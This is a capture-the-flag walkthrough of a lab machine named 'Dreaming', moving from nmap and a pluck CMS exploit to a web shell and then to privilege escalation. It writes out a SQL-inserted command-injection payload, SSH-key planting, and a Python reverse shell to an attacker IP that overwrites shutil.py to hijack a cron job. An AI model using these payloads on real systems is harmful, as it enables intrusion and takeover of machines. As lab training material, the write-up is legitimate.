# Dreaming

### Recover the Kingdom!
Initial scan shows port 22 and 80 open: 

    nmap -p22,80 -sV -sC 10.10.88.80 -oN scan
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 11:22 CEST
    Nmap scan report for 10.10.88.80
    Host is up (0.044s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
    |   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
    |_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Port 80 shows an empy web server, however after running gobuster, I found `/app`, which leads to a webpage that uses `pluck 4.7.13` as CMS. Googling online, I found that this version is vulnerable to authenticated RCE, and found the exploit code [here](https://github.com/0xAbbarhSF/CVE-2020-29607/blob/main/exploit.py).
I clicked on "admin", as showed in the picture below, and it led me to a login page: <br />
![image](https://github.com/user-attachments/assets/7876f7d0-ae68-4674-b691-e05dad7fd843)<br />
I quickly tried basic passwords like "admin" and "password", and I logged in using `password`. So now we can use the exploit that we found (the code is in `exploit.py` of this folder): <br />
![image](https://github.com/user-attachments/assets/699153ef-fab1-44c3-9347-0255335aa95a)<br />
And I now have a (really pretty) web shell: <br />
![image](https://github.com/user-attachments/assets/134acc85-9aba-4613-937b-286c09b4d589)<br />
But I really prefer a classic stabilized shell so i spawned one. After enumerating the machine, i found interesting files inside `/opt`. In particular: <br />
![image](https://github.com/user-attachments/assets/a7fce910-faf0-40a2-af07-edf37218746c)<br />
So I tried to log in as lucien using this password, with `su lucien`, `HeyLucien#@1999!`, and it worked. <br />
Inside lucien's home directory, I have access to his bash history and found something interesting:<br />
![image](https://github.com/user-attachments/assets/b68e5240-7cae-4680-ae8c-e62ad0f29c55)<br />
Also, running `sudo -l` as lucien reveals the following binary: <br />
![image](https://github.com/user-attachments/assets/c1e2c309-64f7-4f43-9f2e-9ae1b2a4bd15)<br />
I run it but it doesn't seem to be any useful:<br />
![image](https://github.com/user-attachments/assets/d17f877e-171d-4a9a-8999-ffa846874303)<br />
I also logged inside the myql database but I wasn't able to find anything useful.<br />
After a while I saw something interesting inside the code of `/opt/getDreams.py`.<br />
![image](https://github.com/user-attachments/assets/22b16128-77b9-4df9-8ced-4a629d55d439)<br />
 Basically it executes the command `echo dreamer + dream`, where `dreamer` and `dream` are the contents of the `library` database, the one on which we have access! So the idea is inject a command as a tuple of the table, so that it executes something like `echo dreamer +; /bin/bash`, something like that. Let's try.  <br />
 Move inside the `library` database, and run the following command `INSERT INTO dreams (dreamer, dream) VALUES ('; whoami #', 'Testing command injection');`. It worked!<br />
 ![image](https://github.com/user-attachments/assets/ed5e3baf-e98e-4d13-b471-e5a8edcf9817)<br />
Now let's insert a command to spawn a shell!<br />
![image](https://github.com/user-attachments/assets/781269c1-feb7-4e66-8973-d556b60706ee)<br />
It kinda worked, but the shell is not very interactive; the command works, but the shell doesn't give the answers back. So one way to make it interactive, is to use ssh:
<br />
On the attacker's machine: 

    ssh-keygen -t rsa -b 4096
On the target machine: 

    mkdir /home/death/.ssh
    echo "PUB_KEY" > home/death/.ssh/authorized_keys

Finally, on the attacker's machine:<br />

    ssh -i Priv_key death@10.10.1.99
And we have our interactive shell: <br />
![image](https://github.com/user-attachments/assets/e0153745-d255-49c2-ae7a-76ee2bf6a6bd)<br />
As death, we can now read his password from the `getDream.py` file:<br />
![image](https://github.com/user-attachments/assets/71a959b6-3513-435c-b01a-86ed8dc95d29)<br />
Now, if we look inside morpheus' home directory, we can see a .py file that we can read:<br />
![image](https://github.com/user-attachments/assets/4e69109e-7921-4d69-ade4-45267b49ca99)<br />
This file imports the shutil library, to which the death user has write access:<br />
![image](https://github.com/user-attachments/assets/f6038e64-7636-411d-b2c9-837bdf15ca66)<br />
We can then overwite this library with a reverse shell, and open a netcat listener, to check if this backup operation is actually a cronjob. Run `echo "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.90.188",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")" > /usr/lib/python3.8/shutil.py` and then on the attacker's machine `nc -lnvp 8888`, wait a minute and get morpheus flag :) 



